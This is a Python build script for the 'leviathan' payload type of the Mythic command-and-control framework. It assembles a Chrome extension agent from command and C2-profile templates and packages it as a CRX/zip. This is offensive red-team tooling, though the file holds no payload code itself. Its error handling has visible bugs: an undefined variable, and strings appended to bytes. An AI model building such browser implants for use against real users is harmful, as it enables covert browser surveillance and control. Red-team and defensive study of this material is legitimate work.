import asyncio
import os
import shutil
import tempfile
import uuid
from distutils.dir_util import copy_tree

from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.PayloadBuilder import *


class Leviathan(PayloadType):

    name = "leviathan"
    file_extension = "zip"
    author = "@xorrior"
    supported_os = [SupportedOS.Chrome]
    wrapper = False
    mythic_encrypts = True
    support_browser_scripts = [
        BrowserScript(script_name="create_table", author="@sysop_host"),
        BrowserScript(script_name="epoch_to_human_readable", author="@sysop_host"),
        BrowserScript(script_name="iso_date_to_human_readable", author="@sysop_host"),
        BrowserScript(script_name="long_epoch_to_human_readable", author="@sysop_host")
    ]
    wrapped_payloads = []
    note = "This payload uses javascript, html, and CSS for execution in the context of a browser via a Chrome Browser extension"
    supports_dynamic_loading = False
    build_parameters = {
        "name": BuildParameter(
            name="name",
            parameter_type=BuildParameterType.String,
            description="Name of your extension",
            default_value="example",
            required=False,
        ),
        "update_url": BuildParameter(
            name="update_url",
            parameter_type=BuildParameterType.String,
            description="The url that hosts the update manifest file (xml)",
            default_value="http://www.example.com/update.xml",
        ),
        "url": BuildParameter(
            name="url",
            parameter_type=BuildParameterType.String,
            description="The home page url for your extension. This will be used as the default location for when a user clicks on your extension icon in the toolbar",
            default_value="http://www.example.com",
        ),
        "version": BuildParameter(
            name="version",
            parameter_type=BuildParameterType.String,
            description="The version for your extension",
            default_value="1.0",
        ),
    }
    c2_profiles = ["leviathan-websocket"]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)
        # create the payload
        try:
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
            # shutil to copy payload files over
            copy_tree(self.agent_code_path, agent_build_path.name)
            command_code = ""
            for cmd in self.commands.get_commands():
                command_code += (
                    open(
                        "{}/commands/{}.js".format(agent_build_path.name, cmd), "r"
                    ).read()
                    + "\n"
                )
            file1 = open(
                "{}/chrome-extension.js".format(agent_build_path.name), "r"
            ).read()
            file1 = file1.replace("UUID_HERE", self.uuid)
            file1 = file1.replace("COMMANDS_HERE", command_code)
            all_c2_code = ""
            for c2 in self.c2info:
                profile = c2.get_c2profile()
                c2_code = open(
                    "{}/c2/{}.js".format(agent_build_path.name, profile["name"]), "r"
                ).read()
                for key, val in c2.get_parameters_dict().items():
                    if isinstance(val, dict):
                        c2_code = c2_code.replace(key, val["enc_key"] if val["enc_key"] is not None else "")
                    else:
                        c2_code = c2_code.replace(key, val)
                all_c2_code += c2_code
            file1 = file1.replace("C2PROFILE_HERE", all_c2_code)
            with open("{}/extension/main.js".format(agent_build_path.name), "w") as f:
                f.write(file1)
            file = open("{}/manifest.json".format(agent_build_path.name), "r").read()
            file = file.replace("EXTENSION_NAME_REPLACE", self.get_parameter("name"))
            file = file.replace("DESCRIPTION_REPLACE", self.get_parameter("name"))
            file = file.replace(
                "http://www.example.com/debugextension", self.get_parameter("url")
            )
            file = file.replace(
                "http://www.example.com/update.xml", self.get_parameter("update_url")
            )
            file = file.replace("VERSION_REPLACE", self.get_parameter("version"))
            with open(
                "{}/extension/manifest.json".format(agent_build_path.name), "w"
            ) as f:
                f.write(file)
            command = "python /CRX3-Creator/main.py {}/extension".format(
                agent_build_path.name
            )
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=agent_build_path.name,
            )
            stdout, stderr = await proc.communicate()
            if stdout:
                stdout += f"[stdout]\n{stdout.decode()}\n"
            if stderr:
                stderr += f"[stderr]\n{stderr.decode()}"
            if os.path.exists("{}/extension.crx".format(agent_build_path.name)):
                temp_uuid = str(uuid.uuid4())
                shutil.make_archive(
                    "{}/{}".format(agent_build_path.name, temp_uuid),
                    "zip",
                    "{}".format(agent_build_path.name),
                )
                resp.payload = open(
                    "{}/{}.zip".format(agent_build_path.name, temp_uuid), "rb"
                ).read()
                resp.status = BuildStatus.Success
                resp.build_message = "created zip of chrome extension files"
            else:
                # something went wrong, return our errors
                resp.set_status(BuildStatus.Error)
                resp.build_stdout = str(stdout)
                resp.build_stderr = str(stderr)
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e) + "\n" + stdout_err
        return resp
